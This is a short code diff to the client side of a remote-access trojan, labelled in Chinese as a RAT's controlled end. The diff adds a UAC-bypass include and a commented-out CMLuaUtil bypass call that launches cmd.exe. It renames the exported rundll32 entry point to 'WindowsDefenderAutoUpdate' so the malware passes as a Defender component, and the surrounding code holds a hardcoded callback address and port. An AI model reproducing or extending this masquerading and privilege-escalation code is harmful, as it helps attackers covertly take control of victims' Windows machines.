@@ -1,5 +1,5 @@
 ﻿//////////////////////////////////////////////////////////////////
-//				Mua远控木马被控端								//
+//				MUA远控木马被控端								//
 //																//
 //				Author: iyzyi(狗小剩)							//
 //				From  : BXS @ CUMT								//
@@ -18,6 +18,7 @@
 #include "Misc.h"
 #include "Login.h"
 #include "SocketClientManage.h"
+#include "BypassUAC.h"
 
 
 typedef struct _REBORN_THREAD_PARAM {
@@ -65,7 +66,7 @@ int wmain(int argc, wchar_t *argv[]) {
 #ifdef _RELEASE
 
 //不写extern "C"的话，函数名就被VC给改了，就没法用我们定义的函数名来通过rundll32执行该函数了
-extern "C" __declspec(dllexport) void RunMuaClient();
+extern "C" __declspec(dllexport) void WindowsDefenderAutoUpdate();
 
 
 BOOL APIENTRY DllMain(HMODULE hModule,
@@ -85,7 +86,10 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 }
 
 
-_declspec(dllexport) void RunMuaClient() {
+_declspec(dllexport) void WindowsDefenderAutoUpdate() {
+
+	//CMLuaUtilBypassUAC((LPWSTR)L"C:\\Windows\\System32\\cmd.exe");
+
 	WCHAR pszAddress[20] = L"192.168.0.102";
 	WCHAR pszPort[10] = L"5555";
 
